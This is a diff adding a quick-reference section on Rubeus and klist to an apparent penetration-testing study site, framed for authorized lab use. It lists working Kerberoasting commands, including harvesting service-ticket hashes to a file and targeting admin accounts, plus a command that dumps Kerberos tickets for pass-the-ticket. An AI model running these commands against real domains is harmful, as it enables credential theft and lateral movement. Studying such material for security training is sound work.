@@ -13,6 +13,109 @@ keywords: ["Rubeus.exe", "start rubeus", "kerberos", "tickets", "usage"]
 
 {/* Generated from Tools/Quick Reference/Rubeus - Quick Start.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Rubeus.exe: choose the operation and read the result
+
+Inspect and use the saved Kerberos ticket commands.
+
+### What the result establishes
+
+Identify whether you are inspecting tickets, requesting a ticket, importing one or exercising a delegation path.
+
+### Prerequisites and common failures
+
+A ticket's principal, service, realm, lifetime and logon-session placement matter; possessing a ticket does not grant rights absent from its identity.
+
+### Example 1: Commands
+
+Run in: **Windows PowerShell**. Kerberoasting requests tickets; use the authorized lab scope.
+
+```powershell
+.\Rubeus.exe klist
+.\Rubeus.exe kerberoast /outfile:kerberoast.txt
+```
+
+### Example 2: Rubeus — Find a Kerberos Task
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe
+```
+
+Saved context: [Rubeus — Find a Kerberos Task — Rubeus — Find a Kerberos Task](/tools/rubeus). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Rubeus — dump tickets (base64)
+
+Run in: **Saved lab example**.
+
+```cmd
+Rubeus.exe dump /nowrap
+```
+
+Saved context: [Pass the Ticket from Windows — Rubeus — dump tickets (base64)](/password-attacks/pass-the-ticket-from-windows#rubeus-—-dump-tickets-base64). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Show Kerberoastable Account Statistics
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe kerberoast /stats
+```
+
+Saved context: [Kerberoasting from Windows — Show Kerberoastable Account Statistics](/active-directory/kerberoasting-windows#show-kerberoastable-account-statistics). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Write Results to a File
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+```
+
+Saved context: [Kerberoasting from Windows — Write Results to a File](/active-directory/kerberoasting-windows#write-results-to-a-file). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Target One User
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+Saved context: [Kerberoasting from Windows — Target One User](/active-directory/kerberoasting-windows#target-one-user). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Limit Results with an LDAP Filter
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+Saved context: [Kerberoasting from Windows — Limit Results with an LDAP Filter](/active-directory/kerberoasting-windows#limit-results-with-an-ldap-filter). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## klist: choose the operation and read the result
+
+Inspect tickets available to the current logon session or Kerberos cache.
+
+### What the result establishes
+
+Record principal, realm, service names, ticket times and cache/logon-session identity.
+
+### Prerequisites and common failures
+
+Windows and MIT Kerberos klist are different programs; a ticket visible in one cache is not necessarily used by another client or process.
+
+### Example 1: Windows session
+
+Run in: **Windows cmd.exe or PowerShell**.
+
+```text
+klist
+```
+
+## Existing notes and worked examples
+
 **Run on:** a Windows lab host, from PowerShell or Command Prompt, in the directory containing `Rubeus.exe`.
 
 ```powershell
